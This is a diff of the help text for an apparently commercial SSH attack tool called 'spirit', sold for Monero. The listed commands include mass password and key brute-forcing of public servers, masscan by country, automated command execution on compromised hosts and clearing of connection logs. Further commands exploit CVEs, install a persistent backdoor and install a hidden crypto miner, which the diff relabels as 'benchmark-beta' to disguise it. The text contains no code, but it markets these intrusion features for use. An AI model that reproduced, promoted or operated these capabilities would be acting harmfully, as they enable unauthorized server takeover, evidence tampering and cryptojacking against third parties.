@@ -6,33 +6,33 @@ USAGE:
 
 COMMANDS:
    Basic:
-     brute, B   performs brute-force password guessing against ssh servers (trial 1,000 public IPs / unlimited private IPs)
+     parse, p   [FILE] parse masscan open ports from the -oG file (default open.lst)
      banner, b  grab SSH version (banner) without performing a login
+     brute, B   performs brute-force password guessing against ssh servers (trial 1,000 public IPs / unlimited private IPs)
      scan, s    scan --lan --threads 5000
      zap, z     [IP] clean connection logs (default SSH_CLIENT)
      ports      [INT] generate random ports (1-65535) (default 3)
-     parse, p   [FILE] parse masscan open ports from the -oG file (default open.lst)
-     coin       [ticker] show coin price chart (default XMR)
    Pro:
-     brute-key, k             performs brute-force using a private key (default id_rsa) on users from your p.lst file.
+     masscan, ms              masscan with automatic country zones (default cn)
      omni, o                  auto-ssh on all found.lst hosts and run commands or upload files
      auto-brute, forever, ab  run [ports] [masscan] [parse] [banner] [brute] over and over, automatically on a CIDR of your choice
-     masscan, ms              masscan with automatic country zones (default cn)
+     brute-key, k             performs brute-force using a private key (default id_rsa) on users from your p.lst file.
      abuse                    check your host IP against abuse report databases
-     passwd                   password generator for --user or /etc/passwd file
+     passwd                   parses /etc/passwd file and generates random passwords for uncommon users
    Support:
      buy         buy a spirit license and support this project (XMR only) -- thank you!
      register    spirit register [key]
      upgrade, u  download the latest version features and bug fixes
      partner     become a Spirit Partner and earn XMR up to 30% on referrals
      reset       reset ALL your registered servers
+     coin        [ticker] show coin price chart (default XMR)
    Ultra:
-     exploit, e     tries multiple CVE on local host until one or none works (beta)
-     encrypt-beta   activates encryption for your p.lst & found.lst/ssh files
-     swarm-beta     run an API server to receive found hosts
-     miner-beta     downloads and installs a hidden crypto miner to test server load
-     brutedns-beta  performs reverse DNS and generates specific attack passwords
-     backdoor-beta  installs a persistent backdoor on the host
+     exploit, e      tries multiple CVE on local host until one or none works (beta)
+     encrypt-beta    activates encryption for your p.lst & found.lst/ssh files
+     swarm-beta      run an API server to receive found hosts
+     benchmark-beta  downloads and installs a hidden crypto miner to test server load
+     brutedns-beta   performs reverse DNS and generates specific attack passwords
+     backdoor-beta   installs a persistent backdoor on the host
 
 GLOBAL OPTIONS:
    --timeout value, -t value  --timeout 10s | connection timeout in seconds (default: 10s)
